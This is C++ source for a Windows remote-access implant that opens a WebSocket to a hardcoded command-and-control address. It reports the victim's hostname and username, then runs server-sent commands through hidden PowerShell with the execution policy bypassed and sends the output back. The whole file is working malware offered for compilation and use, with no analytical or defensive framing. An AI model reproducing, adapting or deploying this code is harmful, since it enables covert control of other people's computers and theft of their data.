// ghost_ws.cpp — REALTIME WEBSOCKET IMPLANT (2025)
// Compile:
// cl /O2 /EHsc ghost_ws.cpp winhttp.lib user32.lib advapi32.lib /link /OUT:ghost_ws.exe

#include <windows.h>
#include <winhttp.h>
#include <string>
#include <sstream>
#include <thread>
#include <iomanip>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

// ----------------------------------------------
// CONFIG
// ----------------------------------------------
const wchar_t* SERVER_HOST = L"192.168.8.144";     // C2 SERVER
const INTERNET_PORT SERVER_PORT = 8001;

// ----------------------------------------------
// GLOBALS
// ----------------------------------------------
HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL, hWebSocket = NULL;
std::string implant_id;

// ----------------------------------------------
// POWERSHELL EXECUTION
// ----------------------------------------------
std::string RunPowerShell(const std::string& cmd) {
    std::wstring wcmd = L"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \""
        + std::wstring(cmd.begin(), cmd.end()) + L"\" 2>&1";

    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    CreatePipe(&hRead, &hWrite, &sa, 0);

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    PROCESS_INFORMATION pi = { 0 };

    if (CreateProcessW(NULL, (LPWSTR)wcmd.c_str(), NULL, NULL, TRUE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        CloseHandle(hWrite);

        char buffer[4096];
        DWORD bytesRead;
        std::string output;

        while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
            output.append(buffer, bytesRead);
        }

        CloseHandle(hRead);
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);

        return output.empty() ? "[+] Command executed" : output;
    }

    return "[-] PowerShell failed";
}

// ----------------------------------------------
// SEND TEXT TO WEBSOCKET
// ----------------------------------------------
void WS_Send(const std::string& msg) {
    if (!hWebSocket) return;

    WinHttpWebSocketSend(hWebSocket,
        WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
        (PVOID)msg.data(),
        (DWORD)msg.size());
}

// ----------------------------------------------
// RECEIVE LOOP: COMMANDS FROM SERVER
// ----------------------------------------------
void WS_ReceiveLoop() {
    BYTE buffer[4096];

    while (true) {
        DWORD bytesRead = 0;
        WINHTTP_WEB_SOCKET_BUFFER_TYPE type;

        HRESULT hr = WinHttpWebSocketReceive(
            hWebSocket,
            buffer,
            sizeof(buffer),
            &bytesRead,
            &type
        );

        if (FAILED(hr) || bytesRead == 0) {
            Sleep(1000);
            continue;
        }

        std::string cmd((char*)buffer, bytesRead);

        if (cmd == "PING") {
            WS_Send("PONG");
            continue;
        }

        // Execute received command
        std::string result = RunPowerShell(cmd);

        // Send output back
        WS_Send(result);
    }
}

// ----------------------------------------------
// CONNECT TO WEBSOCKET C2 SERVER
// ----------------------------------------------
bool WS_Connect() {
    hSession = WinHttpOpen(L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        NULL, NULL, 0);

    if (!hSession) return false;

    hConnect = WinHttpConnect(hSession, SERVER_HOST, SERVER_PORT, 0);
    if (!hConnect) return false;

    hRequest = WinHttpOpenRequest(hConnect, L"GET",
        (L"/ws/" + std::wstring(implant_id.begin(), implant_id.end())).c_str(),
        NULL, NULL, NULL,
        WINHTTP_FLAG_ESCAPE_DISABLE);

    if (!hRequest) return false;

    BOOL res = WinHttpSetOption(hRequest,
        WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET,
        NULL, 0);

    if (!res) return false;

    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) return false;
    if (!WinHttpReceiveResponse(hRequest, NULL)) return false;

    hWebSocket = WinHttpWebSocketCompleteUpgrade(hRequest, NULL);
    if (!hWebSocket) return false;

    WinHttpCloseHandle(hRequest);
    hRequest = NULL;

    return true;
}

// ----------------------------------------------
// MAIN IMPLANT LOOP
// ----------------------------------------------
int main() {
    srand(GetTickCount());

    // Generate implant ID
    ULONGLONG tick = GetTickCount64();
    std::ostringstream ss;
    ss << std::hex << std::setw(16) << std::setfill('0') << tick;
    implant_id = ss.str();

    // Connect to C2 via WebSocket
    if (!WS_Connect()) return 0;

    // Send system info
    char hostname[256] = { 0 };
    char username[256] = { 0 };
    DWORD size = 256;

    GetComputerNameA(hostname, &size);
    GetUserNameA(username, &size);

    std::string info = std::string("INFO::") + hostname + "|" + username;
    WS_Send(info);

    // Start receiving commands
    WS_ReceiveLoop();

    return 0;
}
